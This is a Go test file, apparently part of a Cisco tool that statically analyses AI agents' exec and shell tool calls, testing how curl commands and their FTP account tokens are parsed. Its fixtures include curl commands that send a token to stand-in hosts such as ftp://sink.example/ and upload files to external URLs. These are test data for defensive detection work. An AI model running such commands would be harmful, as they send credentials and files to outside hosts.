// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import (
	"testing"
)

func TestCurlSequentialPrefixProofCannotBeMintedFromCallerBooleans(t *testing.T) {
	t.Parallel()

	var zero curlSequentialPrefixProof
	if zero.ok() || zero.covers(0) {
		t.Fatal("zero prefix proof unexpectedly valid")
	}
	forged := curlSequentialPrefixProof{commandID: 1, maxGroup: 3}
	if forged.ok() || forged.covers(0) || forged.covers(3) {
		t.Fatal("numeric-only prefix proof unexpectedly valid")
	}
	if ignorePartial := true; ignorePartial {
		if proveCurlSequentialTransferPrefix(CommandFact{}, curlArgvParse{}).ok() {
			t.Fatal("empty command/parse unexpectedly proved from a caller boolean")
		}
	}
}

func TestProveCurlSequentialTransferPrefix(t *testing.T) {
	t.Parallel()

	const token = "test-ftp-prefix-authority"
	for _, test := range []struct {
		name              string
		input             Input
		wantOK            bool
		wantMaxGroup      int
		wantAuthoritative bool
		wantFTP           bool
		wantForFacts      bool
	}{
		{
			name: "single FTP group",
			input: Input{Tool: "exec", Argv: []string{
				"curl", "--ftp-account", token, "ftp://sink.example/",
			}},
			wantOK:            true,
			wantAuthoritative: true,
			wantFTP:           true,
			wantForFacts:      true,
		},
		{
			name: "later lazy form failure keeps earlier sequential prefix",
			input: Input{Tool: "exec", Argv: []string{
				"curl", "--ftp-account", token, "ftp://one.example/",
				"--next", "--form", "x=@/missing", "https://two.example/",
			}},
			wantOK:            true,
			wantAuthoritative: true,
			wantFTP:           true,
			wantForFacts:      true,
		},
		{
			name: "later lazy upload failure keeps earlier sequential prefix",
			input: Input{Tool: "exec", Argv: []string{
				"curl", "--ftp-account", token, "ftp://one.example/",
				"--next", "--upload-file", "/missing/payload",
				"https://two.example/",
			}},
			wantOK:            true,
			wantAuthoritative: true,
			wantFTP:           true,
			wantForFacts:      true,
		},
		{
			name: "later eager header failure closes prefix",
			input: Input{Tool: "exec", Argv: []string{
				"curl", "--ftp-account", token, "ftp://one.example/",
				"--next", "--header", "@/missing", "https://two.example/",
			}},
			wantAuthoritative: true,
		},
		{
			name: "later eager empty next closes prefix",
			input: Input{Tool: "exec", Argv: []string{
				"curl", "--ftp-account", token, "ftp://one.example/", "--next",
			}},
		},
		{
			name: "later invalid continue offset closes prefix",
			input: Input{Tool: "exec", Argv: []string{
				"curl", "--ftp-account", token, "ftp://one.example/",
				"--next", "--continue-at", "nope", "https://two.example/",
			}},
			wantAuthoritative: true,
		},
		{
			name: "parallel later upload failure closes prefix",
			input: Input{Tool: "exec", Argv: []string{
				"curl", "--parallel", "--ftp-account", token,
				"ftp://one.example/", "--next", "--upload-file",
				"/missing/payload", "https://two.example/",
			}},
			wantAuthoritative: true,
		},
		{
			name: "earlier sequential upload failure yields empty prefix",
			input: Input{Tool: "exec", Argv: []string{
				"curl", "--upload-file", "/missing/payload",
				"https://one.example/", "--next", "--ftp-account", token,
				"ftp://two.example/",
			}},
			wantAuthoritative: true,
		},
		{
			name: "shell short-circuit stays globally advisory",
			input: Input{
				Tool:    "shell",
				Command: "false && curl --ftp-account " + token + " ftp://sink.example/",
			},
			wantOK:  true,
			wantFTP: true,
		},
		{
			name: "ancestor redirect does not authorize curl prefix",
			input: Input{
				Tool:    "shell",
				Command: "curl --ftp-account " + token + " ftp://sink.example/ > /missing/dir/out",
			},
			wantAuthoritative: true,
		},
		{
			name: "pipeline remains ForFacts closed",
			input: Input{
				Tool:    "shell",
				Command: "printf safe | curl --ftp-account " + token + " ftp://sink.example/",
			},
			wantOK:            true,
			wantAuthoritative: true,
			wantFTP:           true,
		},
		{
			name: "local FTP origin remains prefix-proved",
			input: Input{Tool: "exec", Argv: []string{
				"curl", "--ftp-account", token, "ftp://127.0.0.1/",
				"--next", "--form", "x=@/missing", "https://two.example/",
			}},
			wantOK:            true,
			wantAuthoritative: true,
			wantFTP:           true,
			wantForFacts:      true,
		},
		{
			name: "external FTP origin remains prefix-proved",
			input: Input{Tool: "exec", Argv: []string{
				"curl", "--ftp-account", token, "ftp://one.example/",
				"--next", "--form", "x=@/missing", "https://127.0.0.1/",
			}},
			wantOK:            true,
			wantAuthoritative: true,
			wantFTP:           true,
			wantForFacts:      true,
		},
		{
			name: "later interface uncertainty stays globally advisory",
			input: Input{Tool: "exec", Argv: []string{
				"curl", "--ftp-account", token, "ftp://one.example/",
				"--next", "--interface", "missing-interface",
				"https://two.example/",
			}},
			wantOK:       true,
			wantMaxGroup: 1,
			wantFTP:      true,
		},
	} {
		test := test
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			facts := Analyze(test.input)
			if got := facts.Authoritative(); got != test.wantAuthoritative {
				t.Fatalf("Authoritative() = %t, want %t status=%s issues=%v",
					got, test.wantAuthoritative, facts.Parse.Status, facts.Parse.Issues)
			}
			command, ok := curlCommandFact(facts)
			if !ok {
				if test.wantOK || test.wantFTP || test.wantForFacts {
					t.Fatalf("missing curl command: %#v", facts.Commands)
				}
				return
			}
			prefix := proveCurlSequentialTransferPrefix(command, parseCurlArgv(command.Argv))
			if prefix.ok() != test.wantOK {
				t.Fatalf("prefix.ok() = %t, want %t effect=%s redirects=%d pipeline=%d",
					prefix.ok(), test.wantOK, command.Effect, len(command.Redirects), command.PipelineID)
			}
			if test.wantOK && (!prefix.covers(0) || !prefix.covers(test.wantMaxGroup) ||
				prefix.covers(test.wantMaxGroup+1)) {
				t.Fatalf("prefix covers unexpected groups: %#v", prefix)
			}
			got := StaticCurlFTPControlRequestComponents(command)
			if test.wantFTP {
				if len(got) == 0 || got[0].Value != token {
					t.Fatalf("FTP components = %#v, want token %q", got, token)
				}
			} else if len(got) != 0 {
				t.Fatalf("FTP components = %#v, want none", got)
			}
			forFacts := StaticCurlFTPControlRequestComponentsForFacts(facts, command.ID)
			if test.wantForFacts {
				if len(forFacts) == 0 || forFacts[0].Value != token {
					t.Fatalf("ForFacts = %#v, want token %q", forFacts, token)
				}
				return
			}
			if len(forFacts) != 0 {
				t.Fatalf("ForFacts leaked components: %#v", forFacts)
			}
		})
	}
}

func curlCommandFact(facts Facts) (CommandFact, bool) {
	for index := range facts.Commands {
		if facts.Commands[index].Program == "curl" {
			return facts.Commands[index], true
		}
	}
	return CommandFact{}, false
}
